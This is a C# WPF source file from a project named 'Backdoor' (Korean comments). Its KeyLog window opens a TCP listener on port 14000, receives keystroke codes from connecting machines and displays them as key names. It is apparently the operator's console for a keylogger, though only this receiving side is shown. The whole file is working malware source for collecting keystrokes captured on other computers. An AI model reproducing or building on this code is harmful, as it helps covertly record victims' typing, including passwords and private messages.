using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Backdoor
{
    /// <summary>
    /// KeyLog.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class KeyLog : Window
    {
        public KeyLog()
        {
            InitializeComponent();
            Start();
        }
        static Socket Lis_sock;
        static Thread Lis_Thread;
        

        /// <summary>
        /// 네트워크 진입점
        /// </summary>
        public void Start()
        {
            Lis_sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                foreach (IPAddress Addr in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (Addr.AddressFamily == AddressFamily.InterNetwork)
                    {
                        Lis_sock.Bind(new IPEndPoint(Addr,14000));
                        break;
                    }
                }
                Lis_sock.Listen(5);
                ThreadStart threadStart = new ThreadStart(Listen);
                Lis_Thread = new Thread(threadStart);
                Lis_Thread.Start();
            }
            catch (Exception Ex)
            {
                Log(Ex.StackTrace);
            }
        }

        public void Log(string LogMsg)
        {
            Dispatcher.BeginInvoke((Action)delegate
            {
                KeyLogBox.AppendText(LogMsg + "\n");
            });
        }

        /// <summary>
        /// 로그를 받기 위해 대기하는 스레드
        /// </summary>
        void Listen()
        {
            try
            {
                while (true)
                {
                    Socket Acc_sock = Lis_sock.Accept();
                    byte[] KeyByte = new byte[4];
                    Acc_sock.Receive(KeyByte);
                    Log(((Keys)BitConverter.ToInt32(KeyByte, 0)).ToString());
                    Acc_sock.Close();
                }
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex.StackTrace);
            }
        }
    }
}
